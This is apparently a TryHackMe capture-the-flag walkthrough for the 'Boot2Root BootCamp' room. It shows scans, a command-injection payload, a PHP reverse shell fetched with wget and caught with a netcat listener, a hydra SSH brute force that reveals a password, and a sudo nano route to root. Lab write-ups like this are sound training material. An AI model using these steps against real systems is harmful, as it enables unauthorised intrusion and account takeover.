## Boot2Root BootCamp [THM]



Link: https://tryhackme.com/room/boot2rootbootcamp

Goal: user.txt and root.txt

## nmap
```
nmap -sC -sV 10.10.0.138 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-03 10:21 EDT
Nmap scan report for 10.10.0.138
Host is up (0.24s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT      STATE    SERVICE         VERSION
22/tcp    open     ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 21:e3:e7:8d:9b:87:30:20:54:1a:e7:f8:13:67:20:ca (RSA)
|   256 6d:e0:a0:84:28:52:cc:9f:52:90:56:90:d4:68:fb:33 (ECDSA)
|_  256 07:ee:49:b0:03:ca:4f:a4:bd:ae:ae:0d:80:36:8e:ac (ED25519)
80/tcp    open     http            Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/th15_1mp0551bl3_t0_f1nd/
|_http-title: Hello There!
1152/tcp  filtered winpoplanmess
2725/tcp  filtered msolap-ptp2
3370/tcp  filtered satvid-datalnk
6667/tcp  filtered irc
7000/tcp  filtered afs3-fileserver
16016/tcp filtered unknown
19801/tcp filtered unknown
25734/tcp filtered unknown
27355/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.19 seconds
```
- port 22 open
- port 80 open

## view web [port 80]

![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/a9305310-0b93-4910-82b4-cde266bd1bc4)

## dirsearch

```
dirsearch -u 10.10.0.138 
                                                                                           
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Target: http://10.10.0.138/

[10:33:37] Starting:                                            
[10:34:35] 200 -  938B  - /images/                                                 
[10:34:36] 200 -  535B  - /index.html                                       
[10:34:54] 200 -   50B  - /robots.txt                                       
                                                                             
Task Completed
```
- /robots.txt

## robots.txt

![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/da0afcd7-0136-4c29-a022-2b3fd404a49b)

- found directory /th15_1mp0551bl3_t0_f1nd/

## dirsearch /th15_1mp0551bl3_t0_f1nd/

```
dirsearch -u 10.10.0.138/th15_1mp0551bl3_t0_f1nd/
                                                                                                          
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Target: http://10.10.0.138/th15_1mp0551bl3_t0_f1nd/

[10:39:10] Starting:                   
[10:40:05] 200 -  228B  - /th15_1mp0551bl3_t0_f1nd/index.php                
[10:40:05] 200 -  228B  - /th15_1mp0551bl3_t0_f1nd/index.php/login/         
                                                                            
Task Completed 
```

- /th15_1mp0551bl3_t0_f1nd/index.php

## index.php

![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/cfe24485-2750-49dc-aa76-f5513722915a)

- the bold "please" maybe a hint for this page

## exploit using parameter please [basic RCE]

![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/c954b127-5ed3-4492-bc76-baa7790e0848)

- payload `index.php?please=whoami`

## upload reverse shell using wget

![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/b4aaad46-51fa-438a-83a1-b7cfcfd51cbb)

- create php reverse shell, open python web server `python3 -m http.server <port>` to transfer from local to server

## setup netcat listener

![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/caeae79e-b4e0-4244-9905-b3616c7e19a5)

- goto `http://10.10.0.138/th15_1mp0551bl3_t0_f1nd/rev.php` dont forget to open listener `nc -lnvp 1337` on terminal
- `python3 -c 'import pty;pty.spawn("/bin/bash")'` to upgrade shell
- `export TERM=xterm` enable clear

## cd /home/human

![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/87a0bdbe-4a58-4d8d-b548-36ccc42c9834)

- user.txt
- password_list.txt

## user.txt

![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/97c1876b-a001-405c-97a2-6701a32042a9)

## download password_list.txt

![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/fd7f31df-c871-4759-b906-31a07e1a3374)

- same process with upload reverse shell, but this from server to local

## hydra [bruteforce ssh password]

```
hydra -l human -P password_list.txt 10.10.0.138 ssh -t 4 -V

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
[DATA] max 4 tasks per 1 server, overall 4 tasks, 38 login tries (l:1/p:38), ~10 tries per task
[DATA] attacking ssh://10.10.0.138:22/
[22][ssh] host: 10.10.0.138   login: human   password: cuteyadmin
```

- found Username: human, Password: cuteyadmin

## connect ssh [port 22]

![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/b8a0decb-0bce-44dd-bdb4-037f35a8eccc)

- using credentials found from hydra

## privilege escalation

![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/59816c82-2995-42dc-b98c-b167107c4d41)

- using `sudo -l`

![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/aa909129-ee16-46b3-8671-329476d6bd24)

- Search GTFObins for [nano](https://gtfobins.github.io/gtfobins/nano/)

![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/b55b6c18-f050-4a7d-afc8-fe84e7c44296)

- root!

## root.txt

![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/45361027-e1fa-4e3e-8cc2-c946f667555f)

- PWNED! :star:
